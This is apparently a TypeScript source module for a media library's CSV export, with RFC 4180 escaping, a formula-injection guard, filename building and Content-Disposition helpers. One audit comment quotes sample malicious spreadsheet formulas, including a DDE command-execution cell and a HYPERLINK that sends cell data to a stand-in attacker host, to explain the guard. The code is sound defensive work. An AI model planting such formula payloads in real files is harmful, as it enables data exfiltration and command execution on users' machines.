// 05-04 T1.A: pure CSV encoder + filename builder + RFC 5987 helpers.
// Phase 5 Plan 05-04 (CSV Export) — AC-1, AC-4.
//
// Pure module — NO db, NO fs, NO fetch. Used by the streaming Route Handler
// at app/api/library/export.csv/route.ts.

import type { FileRow } from '@/src/lib/db/schema';

// AC-1: column list — order is part of the public response contract; tests
// pin both the header line text and the per-row field order against this
// constant. Adding columns here is a breaking change for downstream
// consumers of the exported CSV.
export const CSV_HEADERS: readonly string[] = [
  'id',
  'path',
  'size_bytes',
  'bitrate',
  'codec',
  'duration_seconds',
  'width',
  'height',
  'container',
  'status',
  'last_scanned_at_iso',
  'content_hash',
] as const;

// 3-byte UTF-8 BOM. Excel-on-Windows requires it to render UTF-8 as UTF-8
// instead of falling back to the system code page (mojibake on ä/ö/ü).
export const BOM_BYTES: Uint8Array = Uint8Array.of(0xef, 0xbb, 0xbf);

// RFC 4180 §2: line terminator is CRLF. Bare LF works in modern spreadsheets
// but breaks legacy importers; CRLF is the conformance baseline.
export const CRLF = '\r\n';

const CSV_QUOTE_TRIGGER_RE = /[",\r\n]/;

// audit-added 05-06 / F-04-001 (OWASP CSV Formula Injection):
// Excel / LibreOffice / Google Sheets evaluate cells whose first character is
// =, +, -, @, 0x09 (tab), or 0x0d (CR) as formulas. Filenames containing such
// leading chars (legitimate: `-Movie.mkv`, `+1-thriller.mp4`; malicious:
// `=cmd|'/c calc'!A1`, `=HYPERLINK("attacker.example/x?d="&A1,"click")`) end
// up evaluated when the operator opens the export. Mitigation: prefix any
// STRING field starting with one of these chars with a single quote `'` —
// spreadsheets render the cell as literal text. Numeric fields are exempt
// because spreadsheet apps render numeric cells as numbers, never formulas.
const CSV_FORMULA_PREFIX_RE = /^[=+\-@\t\r]/;

/**
 * RFC 4180 §2 escape + OWASP CSV-injection guard: prefix-guard string fields
 * whose first char is in {=, +, -, @, \t, \r}; then wrap in `"` when the
 * (possibly guarded) value contains a comma, quote, CR, or LF; double
 * internal quotes. null/undefined → empty string. numbers → String(n) —
 * passed through unchanged because numeric cells are never formula-evaluated.
 * Idempotent on already-safe ASCII.
 */
export function csvEscape(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '';
  if (typeof value === 'number') return String(value);
  const guarded = CSV_FORMULA_PREFIX_RE.test(value) ? `'${value}` : value;
  if (!CSV_QUOTE_TRIGGER_RE.test(guarded)) return guarded;
  return `"${guarded.replace(/"/g, '""')}"`;
}

/** Compose one CSV row in CSV_HEADERS column order. Excludes the trailing CRLF. */
export function rowToCsvLine(row: FileRow): string {
  const lastScannedIso = new Date(row.last_scanned_at * 1000).toISOString();
  const fields: (string | number | null)[] = [
    row.id,
    row.path,
    row.size_bytes,
    row.bitrate,
    row.codec,
    row.duration_seconds,
    row.width,
    row.height,
    row.container,
    row.status,
    lastScannedIso,
    row.content_hash,
  ];
  return fields.map(csvEscape).join(',');
}

function pad2(n: number): string {
  return n < 10 ? `0${n}` : String(n);
}

// 14-03 audit SR1: share-scope segment for the CSV filename. Forensic evidence
// chain — operator exporting 3 different shares back-to-back must NOT receive
// 3 identically-named files; downstream SOC 2 reconstruction needs share-scope
// embedded in the artifact name.
export type ExportScope =
  | { type: 'all' }
  | { type: 'orphan' }
  | { type: 'share'; id: number; name: string };

/** Normalize a share-name to a filename-safe slug (ASCII-only, hyphenated, ≤32 chars). */
function slugifyShareName(name: string): string {
  const slug = name
    .toLowerCase()
    .replace(/[^a-z0-9]+/g, '-')
    .replace(/^-+|-+$/g, '')
    .slice(0, 32)
    .replace(/^-+|-+$/g, '');
  return slug.length > 0 ? slug : 'unknown';
}

/**
 * `x265-butler-library-YYYYMMDD-HHMMSS.csv` (UTC, zero-padded). Single Date
 * captured before response construction guarantees the filename matches the
 * timestamp the operator sees in their download manager.
 *
 * 14-03 audit SR1: optional `scope` arg appends a share-scope segment for
 * audit-trail provenance. Default `{ type: 'all' }` preserves back-compat for
 * existing single-arg callers (and pre-14-03 test snapshots).
 */
export function buildExportFilename(now: Date, scope: ExportScope = { type: 'all' }): string {
  const y = now.getUTCFullYear();
  const m = pad2(now.getUTCMonth() + 1);
  const d = pad2(now.getUTCDate());
  const hh = pad2(now.getUTCHours());
  const mm = pad2(now.getUTCMinutes());
  const ss = pad2(now.getUTCSeconds());
  const ts = `${y}${m}${d}-${hh}${mm}${ss}`;
  if (scope.type === 'all') {
    return `x265-butler-library-${ts}.csv`;
  }
  if (scope.type === 'orphan') {
    return `x265-butler-library-share-orphan-${ts}.csv`;
  }
  return `x265-butler-library-share-${scope.id}-${slugifyShareName(scope.name)}-${ts}.csv`;
}

/**
 * RFC 5987 dual-form Content-Disposition. Same shape as
 * app/api/logs/[jobId]/download/route.ts (acknowledged duplication; deferred
 * shared-helper extraction documented in the plan boundaries).
 */
export function contentDisposition(filename: string): string {
  const ascii = filename.replace(/[^\x20-\x7e]/g, '_');
  const encoded = encodeURIComponent(filename);
  return `attachment; filename="${ascii}"; filename*=UTF-8''${encoded}`;
}
